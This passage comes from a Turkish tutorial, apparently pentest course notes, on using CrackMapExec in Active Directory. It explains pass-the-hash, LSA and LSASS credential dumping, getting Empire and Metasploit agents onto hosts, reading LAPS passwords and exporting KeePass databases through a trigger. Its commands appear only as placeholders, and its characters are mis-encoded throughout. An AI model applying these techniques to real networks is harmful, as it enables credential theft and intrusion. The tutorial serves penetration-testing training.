EÄŸer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanÄ±cÄ±larÄ± gÃ¶sterecek ve bize etkin kullanÄ±cÄ±larÄ±n listesini Ã§Ä±karma seÃ§eneÄŸi sunacaktÄ±r.


### YalnÄ±zca Enabled HesaplarÄ± GÃ¶sterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiÄŸimiz ÅŸifreler NTLM hash'leridir. Hash'leri kÄ±rmayÄ± deneyebilir veya parolayÄ± kÄ±rmadan kullanÄ±cÄ± olarak kimlik doÄŸrulamasÄ± yapmak iÃ§in `Pass the Hash` tekniÄŸini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doÄŸrulama yÃ¶ntemi olarak bir NTLM hash'i gerektiren `-H` seÃ§eneÄŸine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doÄŸrulamasÄ± SMB, WinRM , RDP, LDAP ve MSSQL protokolleri iÃ§in desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent Ã§alÄ±ÅŸtÄ±rmadan hash dump iÅŸlemi gerÃ§ekleÅŸtiren `impacket-secretsdump`'tan alÄ±nmÄ±ÅŸ `--lsa` seÃ§eneÄŸiyle birlikte gelir. Bu seÃ§enek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak Ã¼zere LSA Secrets'Ä± dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafÄ±ndan kullanÄ±lan kritik veriler iÃ§in benzersiz bir korumalÄ± depolama alanÄ±dÄ±r. LSA, bir sistemin local security policy'sini yÃ¶netmek, denetlemek, kimlik doÄŸrulamak, kullanÄ±cÄ±larÄ±n sistemde oturumunu aÃ§mak, Ã¶zel verileri depolamak vb. iÃ§in tasarlanmÄ±ÅŸtÄ±r. KullanÄ±cÄ±larÄ±n ve sistemlerin hassas verileri gizli dosyalarda saklanÄ±r. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarlarÄ± verileri ÅŸifrelemek iÃ§in kullanÄ±lÄ±r


### LSA'yÄ± inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile baÅŸlayan hash formatÄ± `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayÄ±f bir parola belirlenmiÅŸse `Hashcat` kullanÄ±larak kÄ±rÄ±labilir Ã§Ã¼nkÃ¼ bu algoritma `NTLM`'den Ã§ok daha gÃ¼Ã§lÃ¼dÃ¼r. AyrÄ±ca, Domain Cached Credential hash'leri `Pas the Hash` saldÄ±rÄ±sÄ± iÃ§in kullanÄ±lamaz. BunlarÄ± kÄ±rmak iÃ§in, domain ve kullanÄ±cÄ± adÄ±nÄ± kaldÄ±rmamÄ±z, `$DCC2$` 'den sonraki deÄŸeri almamÄ±z ve Hashcat modÃ¼l 2100'Ã¼ kullanmamÄ±z gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleÄŸi, Windows parolalarÄ±nÄ± `aÃ§Ä±k metin` olarak veya `NTLM` veya `AES256/AES128` gibi diÄŸer hash biÃ§imlerini iÃ§erir. BelleÄŸi dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak iÃ§in etkili bir yol olabilir.

CrackMapExec, LSASS process belleÄŸinin iÃ§eriÄŸini dump etmek iÃ§in Ã§eÅŸitli modÃ¼ller iÃ§erir. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracÄ±, bir dizi host Ã¼zerindeki kimlik bilgilerini remote olarak ayÄ±klamak iÃ§in kullanÄ±lÄ±r. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazÄ±sÄ± nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± aÃ§Ä±klamaktadÄ±r. Bu araÃ§, bir LSASS dump'Ä±ndaki gerekli baytlarÄ± remote okumak iÃ§in `Impacket` projesini ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz` kullanÄ±r.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluÅŸturmak iÃ§in Sysinternals'tan Microsoft `Procdump`'Ä± ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz`'Ä± kullanÄ±r.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracÄ±, **LSASS**'e ait kopyalanmÄ±ÅŸ **handle**'larÄ±n kullanÄ±mÄ±nÄ± gÃ¶stererek, aynÄ± **process**'in **gizlenmiÅŸ** bir bellek dump'Ä±nÄ± oluÅŸturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'Ä±nÄ± oluÅŸturan esnek bir araÃ§tÄ±r. **LSASS**'e bir **handle** aÃ§mak tespit edilebileceÄŸinden, **Nanodump** mevcut **handle**'larÄ± arayabilir. EÄŸer bir **handle** bulunursa, bunu kopyalayÄ±p **minidump** oluÅŸturmak iÃ§in kullanÄ±r. Ancak, bÃ¶yle bir **handle** bulunacaÄŸÄ±nÄ±n garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bÃ¶lgesi veya baÅŸka bir kaynak** ile etkileÅŸime geÃ§mesini saÄŸlayan **benzersiz bir tanÄ±mlayÄ±cÄ±dÄ±r**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bÃ¶lÃ¼mde bir bilgisayardan veya domain'den kimlik bilgilerini almak iÃ§in farklÄ± yÃ¶ntemler gÃ¶sterilmektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir C2 framework ile birlikte kullanÄ±mÄ± incelenecektir.

---


### Bir **C2 Framework** iÃ§inde **session**'larÄ± alma.

CrackMapExec ile ilginÃ§ olabilecek bir ÅŸey, birden fazla hedefi tehlikeye attÄ±ÄŸÄ±mÄ±zda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak Ã§alÄ±ÅŸmak isteyebiliriz. Her hedef makinede bir payload Ã§alÄ±ÅŸtÄ±rmak ve C2'mize bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz.

Bu bÃ¶lÃ¼mde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modÃ¼l ele alÄ±nacaktÄ±r. AyrÄ±ca farklÄ± bir C2 framework'Ã¼ kullanÄ±rsak bir alternatif de keÅŸfedeceÄŸiz.


### Empire

Web sitelerinde saÄŸlanan [kÄ±lavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'Ã¼ yÃ¼kleyerek baÅŸlayacaÄŸÄ±z


### Empire Server'Ä± Kurun ve BaÅŸlatÄ±n

{{CODE_BLOCK_176}}

Daha sonra Empire'Ä± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve ÅŸifre ile Ã§alÄ±ÅŸtÄ±rmamÄ±z gerekiyor. Biz `empireadmin` kullanÄ±cÄ± adÄ±nÄ± ve `asdasd123` ÅŸifresini kullanacaÄŸÄ±z! .


### Empire'Ä± Ã–zel KullanÄ±cÄ± AdÄ± ve Parola ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_177}}

ArdÄ±ndan, CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± ve Empire client yapÄ±landÄ±rma dosyasÄ±nÄ± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve parolayla eÅŸleÅŸecek ÅŸekilde dÃ¼zenlememiz gerekir.

CrackMapExec yapÄ±landÄ±rma dosyasÄ± varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seÃ§eneÄŸini `empireadmin` kullanÄ±cÄ± adÄ± ve `asdasd123` ÅŸifresiyle eÅŸleÅŸecek ÅŸekilde deÄŸiÅŸtirmemiz gerekiyor! . VarsayÄ±lan olarak, Empire local server `1337` portunda Ã§alÄ±ÅŸÄ±r. CrackMapExec yapÄ±landÄ±rma dosyasÄ±nda deÄŸiÅŸtirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


AynÄ± ÅŸeyi Empire yapÄ±landÄ±rma dosyasÄ± iÃ§in de yapmamÄ±z gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### Ä°nceleme

{{CODE_BLOCK_179}}


YapÄ±landÄ±rma dosyalarÄ± deÄŸiÅŸtirildikten sonra, Empire client ile Empire sunucusuna baÄŸlanmalÄ±yÄ±z

{{CODE_BLOCK_180}}

Åimdi listener'Ä± ayarlamamÄ±z gerekiyor ve host'u IP adresimize ve Port'u da aracÄ±nÄ±n baÄŸlanacaÄŸÄ± TCP 8001'e ayarlayacaÄŸÄ±z.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

ArtÄ±k listener'Ä±mÄ±z Ã§alÄ±ÅŸÄ±yor ve `empire_exec` modÃ¼lÃ¼ ile Empire'a bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz. AyarladÄ±ÄŸÄ±mÄ±z listener olan `LISTENER=http` seÃ§eneÄŸini eklememiz gerekiyor.


### CrackMapExec ModÃ¼lÃ¼nÃ¼ Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, PowerShell Empire'da yeni bir agent gÃ¶rmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

AynÄ± ÅŸeyi CrackMapExec modÃ¼lÃ¼ `web_delivery` kullanarak Metasploit Framework Ã¼zerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modÃ¼lÃ¼nÃ¼ yapÄ±landÄ±rmamÄ±z ve saÄŸlanan URL'yi CrackMapExec modÃ¼lÃ¼mÃ¼ze bir parametre olarak kullanmamÄ±z gerekir. Msfconsole'u baÅŸlatalÄ±m ve `web_delivery` handler'Ä±nÄ± yapÄ±landÄ±ralÄ±m


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapÄ±landÄ±rÄ±ldÄ±ktan sonra web_delivery modÃ¼lÃ¼nÃ¼ kullanabiliriz. `URL` ve `PAYLOAD` olmak Ã¼zere iki seÃ§eneÄŸi destekler. URL seÃ§eneÄŸini Metasploit tarafÄ±ndan saÄŸlanan URL ile ayarlamamÄ±z gerekir ve PAYLOAD seÃ§eneÄŸi seÃ§tiÄŸimiz payload mimarisine karÅŸÄ±lÄ±k gelir. EÄŸer `x64` kullanÄ±yorsak, `x64` varsayÄ±lan deÄŸer olduÄŸu iÃ§in bu seÃ§eneÄŸi atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. EÄŸer `32 bit` payload kullanÄ±yorsak `PAYLOAD=32` seÃ§eneÄŸini ayarlamamÄ±z gerekir. Åimdi bunu Ã§alÄ±ÅŸÄ±rken gÃ¶relim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum gÃ¶rmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

BaÅŸka bir C2 Framework kullanmak istediÄŸimizde, **Command Execution** bÃ¶lÃ¼mÃ¼nde bahsedilen (SMB, WinRM, SSH) yÃ¶ntemleri kullanarak aynÄ± sonucu elde edebiliriz. Ã–rneÄŸin, bir **PowerShell** payload'u oluÅŸturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip Ã§alÄ±ÅŸtÄ±rmak iÃ§in **-X** seÃ§eneÄŸiyle bir PowerShell komutu Ã§alÄ±ÅŸtÄ±rabiliriz. AyrÄ±ca, iÅŸlemi arka planda yÃ¼rÃ¼tmek iÃ§in **`--no-output`** seÃ§eneÄŸini seÃ§memiz gerekecektir.

Ã–rnek olarak Metasploit'i kullanalÄ±m ve modÃ¼lÃ¼ kullanmak yerine web_delivery payload'unda saÄŸlanan PowerShell script'ini kopyalamayÄ± deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bÃ¶lÃ¼m, CrackMapExec'i C2 Frameworks gibi diÄŸer bilgisayar korsanlÄ±ÄŸÄ± araÃ§larÄ±yla nasÄ±l kullanabileceÄŸimizi araÅŸtÄ±rÄ±yor. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in BloodHound ile nasÄ±l entegre edileceÄŸi incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldÄ±rganlar hem de savunmacÄ±lar tarafÄ±ndan alan gÃ¼venliÄŸini analiz etmek iÃ§in kullanÄ±lan aÃ§Ä±k kaynaklÄ± bir araÃ§tÄ±r. AraÃ§, domain'den toplanan bÃ¼yÃ¼k miktarda veriyi alÄ±r. Ä°liÅŸkiyi gÃ¶rsel olarak temsil etmek ve geleneksel numaralandÄ±rma ile tespit edilmesi zor veya imkansÄ±z olan domain saldÄ±rÄ± yollarÄ±nÄ± belirlemek iÃ§in grafik teorisini kullanÄ±r. Bu bÃ¶lÃ¼mde Bloodhound'a aÅŸina olduÄŸunuzu varsayÄ±yoruz. 


### **BloodHound**'da **Owned** olarak iÅŸaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geÃ§irilmiÅŸ (owned) olarak iÅŸaretleyebiliriz. Bunu yapmak iÃ§in node'a saÄŸ tÄ±klayÄ±p **`Mark X as Owned`** seÃ§eneÄŸine tÄ±klamamÄ±z yeterlidir. Bu, ele geÃ§irdiÄŸimiz kullanÄ±cÄ±larÄ± ve bilgisayarlarÄ± takip etmek aÃ§Ä±sÄ±ndan faydalÄ±dÄ±r, Ã¶zellikle bÃ¼yÃ¼k bir organizasyonla Ã§alÄ±ÅŸÄ±rken. AyrÄ±ca, **`Shortest Path from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan En KÄ±sa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan Domain Adminlerine En KÄ±sa Yollar) gibi bir BloodHound cypher sorgusu gerÃ§ekleÅŸtirmek istediÄŸimizde de kullanÄ±ÅŸlÄ±dÄ±r.

CrackMapExec'i, ele geÃ§irdiÄŸimiz herhangi bir user veya computer'Ä± BloodHound veritabanÄ±nda `owned` olarak iÅŸaretleyecek ÅŸekilde yapÄ±landÄ±rabiliriz. Bunu yapmak iÃ§in, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± aÅŸaÄŸÄ±daki seÃ§eneklerle deÄŸiÅŸtirmemiz gerekir:

* Bloodhound yapÄ±landÄ±rma seÃ§eneÄŸi `bh_enabled`'Ä± `True` olarak ayarlayÄ±n.
* `bh_uri`'yi Bloodhound veritabanÄ± `IP` adresimize ayarlayÄ±n.
* `bh_port`'u veritabanÄ± `portuna` ayarlayÄ±n
* Kimlik bilgilerini bloodhound veritabanÄ±yla eÅŸleÅŸecek ÅŸekilde ayarlayÄ±n: kullanÄ±cÄ± adÄ± `neo4j` ve ÅŸifre `asdasd123` (VeritabanÄ±nÄ±za karÅŸÄ±lÄ±k geleni kullandÄ±ÄŸÄ±nÄ±zdan emin olun).

YapÄ±landÄ±rma aÅŸaÄŸÄ±daki gibi gÃ¶rÃ¼nmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: BaÄŸlandÄ±ÄŸÄ±nÄ±z BloodHound veritabanÄ±na karÅŸÄ±lÄ±k gelen kullanÄ±cÄ± adÄ± ve parolayÄ± kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

### Bloodhound Verilerinin ToplanmasÄ±

BloodHound verilerini toplamak iÃ§in CrackMapExec kullanarak SharpHound'u Ã§alÄ±ÅŸtÄ±racak ve ardÄ±ndan dosyayÄ± saldÄ±rÄ± hostumuza aktaracaÄŸÄ±z.

### BloodHound verilerinin toplanmasÄ±

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Åimdi BloodHound'u aÃ§mamÄ±z ve verileri iÃ§e aktarmamÄ±z gerekiyor.


### BloodHound'da KullanÄ±cÄ±larÄ± Owned Olarak Ayarlama

Veriler iÃ§e aktarÄ±ldÄ±ktan sonra, `robert` kullanÄ±cÄ±sÄ± ile baÄŸlanmaya Ã§alÄ±ÅŸÄ±rsak, kullanÄ±cÄ±yÄ± BloodHound veritabanÄ±nda owned olunan olarak ayarlayacaktÄ±r.

### KullanÄ±cÄ± BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanÄ±cÄ±sÄ± olan bir makineyi tehlikeye atarsak da aynÄ± ÅŸey olacaktÄ±r. Bulunan tÃ¼m yeni kullanÄ±cÄ±larÄ± owned olarak ayarlayacaktÄ±r.

### Procdump ModÃ¼lÃ¼ ile KullanÄ±cÄ±larÄ± Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: TÃ¼m CrackMapExec seÃ§enekleri BloodHound veritabanÄ± ile senkronize olmayacaktÄ±r. Ã–rneÄŸin, `--ntds` veya `--lsa` seÃ§eneklerini denersek, kullanÄ±cÄ±larÄ± veritabanÄ±nda sahip olunan olarak iÅŸaretlemez, ancak `procdump` veya `lsassy` gibi modÃ¼ller kullanÄ±cÄ±larÄ± sahip olunan olarak iÅŸaretler.


### BloodHound'da BilgisayarlarÄ± Owned Olarak Ayarlama

YazÄ±m sÄ±rasÄ±nda, BloodHound entegrasyonu yalnÄ±zca user'larÄ± Owned olarak iÅŸaretlemektedir. Bir `computer` owned olarak iÅŸaretlemek istiyorsak, `bh_owned` modÃ¼lÃ¼nÃ¼ ve `neo4j` veritabanÄ±mÄ±zÄ±n kullanÄ±cÄ± adÄ± ve ÅŸifresini kullanabiliriz. AÅŸaÄŸÄ±daki Ã¶rnekte, diÄŸer varsayÄ±lan deÄŸerler neo4j veritabanÄ±mÄ±zla eÅŸleÅŸtiÄŸi iÃ§in yalnÄ±zca `PASS` seÃ§eneÄŸini ekleyeceÄŸiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, bÃ¼yÃ¼k aÄŸlarla uÄŸraÅŸÄ±rken birÃ§ok seÃ§enek sunar ve mÃ¼ÅŸterilerimizle paylaÅŸmak istememiz durumunda veritabanÄ±nÄ± gÃ¼ncellemenin hÄ±zlÄ± bir yoludur. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec'te mevcut olan bazÄ± popÃ¼ler modÃ¼llerle Ã§alÄ±ÅŸacaÄŸÄ±z.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici ÅŸeylerden biri, modÃ¼ler olmasÄ± ve herkesin modÃ¼ller oluÅŸturmasÄ±na ve bunlarÄ± araca katkÄ±da bulunmasÄ±na izin vermesidir. CrackMapExec, exploit ve exploit sonrasÄ± gÃ¶revleri kolaylaÅŸtÄ±rmak iÃ§in iÅŸlemler gerÃ§ekleÅŸtirmemizi saÄŸlayan 50'den fazla modÃ¼le sahiptir. Bu bÃ¶lÃ¼mde LDAP ve SMB protokolleri iÃ§in bu modÃ¼llerden bazÄ±larÄ± incelenecektir.


### LDAP Protocol Modules

LDAP protokolÃ¼ yaygÄ±n olarak Domain Controller'lar ile etkileÅŸime geÃ§memizi ve onlardan bilgi almamÄ±zÄ± saÄŸlar. Active Directory'den ilginÃ§ bilgiler Ã§Ä±karmamÄ±zÄ± saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.


### **LDAP Module - get-network**

`get-network` modÃ¼lÃ¼ [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'Ä±  temel alÄ±r. VarsayÄ±lan olarak, Active Directory'deki herhangi bir kullanÄ±cÄ±, `zone transferine` benzer ÅŸekilde Domain veya Forest DNS bÃ¶lgelerindeki tÃ¼m DNS kayÄ±tlarÄ±nÄ± numaralandÄ±rabilir. Bu araÃ§, internal aÄŸlarÄ±n yeniden yapÄ±landÄ±rÄ±lmasÄ± amacÄ±yla bÃ¶lgedeki tÃ¼m DNS kayÄ±tlarÄ±nÄ±n numaralandÄ±rÄ±lmasÄ±nÄ± ve dÄ±ÅŸa aktarÄ±lmasÄ±nÄ± saÄŸlar.

ModÃ¼lÃ¼ kullanmanÄ±n Ã¼Ã§ (3) yolu vardÄ±r:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adlarÄ±).

VarsayÄ±lan olarak, herhangi bir seÃ§enek belirtmezsek, modÃ¼l yalnÄ±zca IP adresini alacaktÄ±r. `ALL=true` seÃ§eneÄŸini seÃ§ersek, hem IP hem de domain adlarÄ±nÄ± alÄ±r ve `ONLY_HOSTS=true` olarak belirtirsek, yalnÄ±zca FQDN'yi alÄ±rÄ±z.


### DNS Sunucusundan (Record) KayÄ±tlarÄ± Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazÄ±nÄ±n yazÄ±ldÄ±ÄŸÄ± zamanda, modÃ¼l **`adidnsdump`** aracÄ±yla bazÄ± farklÄ±lÄ±klar gÃ¶stermektedir. SonuÃ§lar, hesaplar arasÄ±nda farklÄ±lÄ±k gÃ¶sterebilir.


### LDAP Module - laps

Bir baÅŸka harika modÃ¼l de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e baÄŸlÄ± bilgisayarlarda local hesap parolalarÄ±nÄ±n yÃ¶netimini saÄŸlar. Parolalar Active Directory'de (AD) saklanÄ±r ve ACL'ler tarafÄ±ndan korunur, bÃ¶ylece yalnÄ±zca belirli kullanÄ±cÄ±lar bunlarÄ± okuyabilir veya `parola sÄ±fÄ±rlama` talebinde bulunabilir. Laps modÃ¼lÃ¼ ile bir hesabÄ±n okuma eriÅŸimine sahip olduÄŸu tÃ¼m bilgisayarlarÄ± alabiliriz. Bir bilgisayarÄ± belirtmek iÃ§in `COMPUTER` seÃ§eneÄŸini de kullanabilir veya benzer ada sahip birkaÃ§ bilgisayarÄ± almak iÃ§in bir wildcard karakterle birlikte kullanabiliriz.


### LAPS ModÃ¼lÃ¼ ParolalarÄ±n AlÄ±nmasÄ±

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: KullanÄ±lan parola bir Ã¶rnektir. Hedef hostta Ã§alÄ±ÅŸmayacaktÄ±r

### LDAP ModÃ¼lÃ¼ - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'Ã¼ ile temsil edilen ve varsayÄ±lan olarak bir **user**'Ä±n bir **domain** iÃ§inde oluÅŸturabileceÄŸi **computer account** sayÄ±sÄ±nÄ± belirten bir **domain level attribute**'tÃ¼r.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazÄ± **attack** senaryolarÄ±nda **domain** iÃ§inde bir **machine** oluÅŸturmak gerekebilir, bu yÃ¼zden **account machine quota attribute**'Ã¼nÃ¼ **enumerate** etmek Ã¶nemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir baÅŸka harika modÃ¼l ise bir veya birden fazla object'in `DACL`'lerini okumamÄ±zÄ± ve dÄ±ÅŸa aktarmamÄ±zÄ± saÄŸlayan `daclread`'dir. Bu modÃ¼l Active Directory eriÅŸimini numaralandÄ±rmamÄ±zÄ± saÄŸlayacaktÄ±r. AÅŸaÄŸÄ±daki seÃ§eneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabÄ±nÄ±n tÃ¼m **ACE**'lerini okumak istiyoruz. Bunun iÃ§in **`TARGET`** seÃ§eneÄŸini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace KullanÄ±cÄ±sÄ±nÄ±n DACL'sini Oku

{{CODE_BLOCK_203}}


AyrÄ±ca belirli haklarÄ± da arayabiliriz, Ã¶rneÄŸin hangi **principal**'larÄ±n **DCSync** haklarÄ±na sahip olduÄŸunu. Bunun iÃ§in **`TARGET_DN`** seÃ§eneÄŸini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seÃ§eneÄŸini seÃ§memiz ve aramak istediÄŸimiz haklarÄ± **`RIGHTS`** seÃ§eneÄŸiyle belirlememiz gerekir.

### DCSync Rights'a Sahip KullanÄ±cÄ±larÄ± Arama

{{CODE_BLOCK_204}}



Ã‡Ä±ktÄ±da gÃ¶sterildiÄŸi gibi, `ACE[4]` `robert` kullanÄ±cÄ±sÄ±nÄ±n hedef domain'de `DCSync` haklarÄ±na sahip olduÄŸunu gÃ¶sterir.

LDAP'ta birkaÃ§ modÃ¼l daha kullanabiliriz. ModÃ¼llerin tam listesini gÃ¶rmek iÃ§in `-L` seÃ§eneÄŸini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolÃ¼nde daha fazla modÃ¼l mevcuttur. CrackMapExec modÃ¼lÃ¼nde yaptÄ±ÄŸÄ±mÄ±z ÅŸeylerin Ã§oÄŸu SMB protokolÃ¼nÃ¼ kullanÄ±r. Ä°lginÃ§ bilgiler elde etmemizi saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.

Not: SMB kullanan modÃ¼llerin Ã§oÄŸunun Ã§alÄ±ÅŸmasÄ± iÃ§in admin haklarÄ±na ( `Pwned!` ) ihtiyaÃ§ vardÄ±r.


### SMB ModÃ¼lleri - get_netconnections ve ioxidresolver

Bir aÄŸ pentesti Ã¼zerinde Ã§alÄ±ÅŸÄ±rken, sÃ¼rekli olarak daha fazla kaynaÄŸa veya aÄŸa eriÅŸim elde etmeye Ã§alÄ±ÅŸÄ±rÄ±z. CrackMapExec, daha Ã¶nce tehlikeye attÄ±ÄŸÄ±mÄ±z bir makineyi numaralandÄ±rmamÄ±za ve birden fazla aÄŸ yapÄ±landÄ±rmasÄ±na sahip olup olmadÄ±ÄŸÄ±nÄ± belirlememize olanak tanÄ±yan bazÄ± modÃ¼llere sahiptir. `get_netconnections` ve `ioxidresolver` modÃ¼llerini kullanalÄ±m ve farklarÄ±nÄ± gÃ¶relim.

`get_netconnections` modÃ¼lÃ¼, aÄŸ baÄŸlantÄ±larÄ±nÄ± sorgulamak iÃ§in `WMI` kullanÄ±r. `IPv6` ve herhangi bir ikincil IP dahil olmak Ã¼zere tÃ¼m IP adreslerinin yanÄ± sÄ±ra domain adÄ±nÄ± da alÄ±r.


### get_netconnections Module

{{CODE_BLOCK_206}}


Ã–te yandan, `ioxidresolver` modÃ¼lÃ¼ IP adreslerini sorgulamak iÃ§in RPC kullanÄ±r. Ancak, bu modÃ¼l `IPv6` adreslerini iÃ§ermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: Ä°htiyaÃ§larÄ±mÄ±za en uygun olanÄ± seÃ§ebilmemiz iÃ§in bir modÃ¼lÃ¼n nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± anlamak Ã¶nemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal aÄŸlarda adminler ve kullanÄ±cÄ±lar tarafÄ±ndan parolalarÄ± ve gizli bilgileri tek bir veritabanÄ±nda saklamak iÃ§in yaygÄ±n olarak kullanÄ±lan Ã¼cretsiz, aÃ§Ä±k kaynaklÄ± bir password manager'dÄ±r. Bir master password onu korur. Bir KeePass veritabanÄ± alÄ±rsak, onu aÃ§mak iÃ§in ÅŸifresine ihtiyacÄ±mÄ±z vardÄ±r.

### KeePass'i KeÅŸfetme

{{CODE_BLOCK_208}}

EÄŸer master parolaya sahip deÄŸilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafÄ±ndan geliÅŸtirilen ve veritabanÄ±nÄ± aÃ§Ä±k metin olarak dÄ±ÅŸa aktarmak iÃ§in KeePass'Ä±n triger sistemini kullanan bir teknik kullanmaktÄ±r. KeePass yapÄ±landÄ±rma dosyasÄ±nÄ±, veritabanÄ±nÄ± otomatik olarak aÃ§Ä±k metin olarak dÄ±ÅŸa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) iÃ§erecek ÅŸekilde deÄŸiÅŸtirir.

Bunu kullanmak iÃ§in beÅŸ (5) adÄ±ma ihtiyacÄ±mÄ±z var:

*  KeePass yapÄ±landÄ±rma dosyasÄ±nÄ± bulun. Biz bunu `keepass_discover` modÃ¼lÃ¼ ile yaptÄ±k.
 * `ACTION=ADD` seÃ§eneÄŸini ve `KEEPASS_CONFIG_PATH` Ã¶ÄŸesini kullanarak trigger'Ä± yapÄ±landÄ±rma dosyasÄ±na ekleyin.

### KeePass YapÄ±landÄ±rma DosyasÄ±na Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapÄ±landÄ±rma yolu iÃ§in ters eÄŸik Ã§izgi (`/`) veya Ã§ift eÄŸik Ã§izgi (`\`) kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

